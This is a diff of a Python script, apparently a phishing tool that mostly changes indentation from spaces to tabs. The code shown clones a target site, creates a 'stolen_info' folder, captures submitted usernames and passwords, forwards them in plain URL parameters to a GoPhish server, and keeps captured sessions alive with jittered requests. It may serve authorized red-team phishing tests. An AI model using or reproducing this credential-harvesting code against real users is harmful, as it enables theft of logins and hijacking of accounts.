@@ -111,23 +111,23 @@ def download_site():
 	response = urllib2.urlopen(args[0])
 	webContent = response.read()
 	if not os.path.exists(os.path.dirname("webroot/index.html")):
-	    try:
-	        os.makedirs(os.path.dirname("webroot/index.html"))
-	    except OSError as exc: # Guard against race condition
-	        if exc.errno != errno.EEXIST:
-	            raise
+		try:
+			os.makedirs(os.path.dirname("webroot/index.html"))
+		except OSError as exc: # Guard against race condition
+			if exc.errno != errno.EEXIST:
+				raise
 	if not os.path.exists(os.path.dirname("webroot/errors/auth.error")):
-	    try:
-	        os.makedirs(os.path.dirname("webroot/errors/auth.error"))
-	    except OSError as exc: # Guard against race condition
-	        if exc.errno != errno.EEXIST:
-	            raise
+		try:
+			os.makedirs(os.path.dirname("webroot/errors/auth.error"))
+		except OSError as exc: # Guard against race condition
+			if exc.errno != errno.EEXIST:
+				raise
 	if not os.path.exists(os.path.dirname("stolen_info/")):
-	    try:
-	        os.makedirs(os.path.dirname("stolen_info/"))
-	    except OSError as exc: # Guard against race condition
-	        if exc.errno != errno.EEXIST:
-	            raise
+		try:
+			os.makedirs(os.path.dirname("stolen_info/"))
+		except OSError as exc: # Guard against race condition
+			if exc.errno != errno.EEXIST:
+				raise
 	with open("webroot/index.html", 'w+') as index:
 		index.write(webContent)
 
@@ -201,29 +201,29 @@ def modify_index():
 
 
 def main():
-  	if(len(args) != 4):
-  		quiet_print("Wrong number of arguments", True)
-  		parser.print_help()
-  		quiet_print("Exiting", True)
-  		exit(1)
-  	ts = time.time()
-  	start_time = datetime.datetime.fromtimestamp(ts).strftime('%Y-%m-%d %H:%M:%S')
-  	log_print(  "----------------------------------------")
-  	quiet_print("-------------Starting Setup-------------", True)
-  	quiet_print("----------" + start_time  + "-----------", True)
-  	log_print(  "----------------------------------------")
-  	download = requests.Session()
-  	live_check = download.get(args[0])
-  	if(live_check.status_code != 200):
-  		quiet_print("Host: " + args[0] + " failed live (200) check", True)
-  		quiet_print("Exiting...", True)
-  		exit(1)
+	if(len(args) != 4):
+		quiet_print("Wrong number of arguments", True)
+		parser.print_help()
+		quiet_print("Exiting", True)
+		exit(1)
+	ts = time.time()
+	start_time = datetime.datetime.fromtimestamp(ts).strftime('%Y-%m-%d %H:%M:%S')
+	log_print(  "----------------------------------------")
+	quiet_print("-------------Starting Setup-------------", True)
+	quiet_print("----------" + start_time  + "-----------", True)
+	log_print(  "----------------------------------------")
+	download = requests.Session()
+	live_check = download.get(args[0])
+	if(live_check.status_code != 200):
+		quiet_print("Host: " + args[0] + " failed live (200) check", True)
+		quiet_print("Exiting...", True)
+		exit(1)
 
-  	download_site()
-  	modify_index()
-  	quiet_print("-------------Setup Complete-------------", True)
-  	quiet_print("-------------Starting Server------------", True)
-  	start_server()
+	download_site()
+	modify_index()
+	quiet_print("-------------Setup Complete-------------", True)
+	quiet_print("-------------Starting Server------------", True)
+	start_server()
 
 
 class user_profile:
@@ -468,7 +468,7 @@ class S(BaseHTTPRequestHandler):
 						users[rid] = user_prof
 						lock.release()
 						requests.post(options.go_phish + "/?rid=" + rid + "&username=" + data["username"] + "&password=" + data["password"], verify=False)
- 				except Exception:
+				except Exception:
 					log_print("Go phish not reachable")
                 
 
@@ -577,15 +577,15 @@ def sessions_management():
 			sys.exit(0)
 		die_lock.release()
 
-	    lock.acquire()
-	    for rid in users:
-	    	user = users[rid]
-	    	for sesh in user.sessions:
-	    		#4 seconds + jitter
-	        	time.sleep(4 + random.randint(0,20))
-	        	sesh.get(args[0])
-	    lock.release()
-	    #5 minutes + jitter
+		lock.acquire()
+		for rid in users:
+			user = users[rid]
+			for sesh in user.sessions:
+				#4 seconds + jitter
+				time.sleep(4 + random.randint(0,20))
+				sesh.get(args[0])
+		lock.release()
+		#5 minutes + jitter
 	    time.sleep((5 * 60) + random.randint(0,2 * 60))
 
 
